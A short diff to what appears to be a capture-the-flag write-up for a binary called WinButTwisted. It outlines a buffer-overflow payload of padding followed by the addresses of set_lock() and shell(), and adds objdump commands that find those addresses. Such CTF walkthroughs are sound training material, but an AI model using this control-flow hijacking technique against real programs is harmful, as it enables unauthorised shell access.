@@ -184,3 +184,15 @@ Now what we need is the address of the set_lock() function and that of shell()
 
 the payload will be structured as follows:
 > Payload = PADDING + set_lock()_address + shell()_address
+
+Address of set_lock()
+```bash
+objdump -d WinButTwisted | grep set_lock  
+08049965 <set_lock>:
+```
+
+Address of shell()
+```bash
+objdump -d WinButTwisted | grep shell   
+08049999 <shell>:
+```
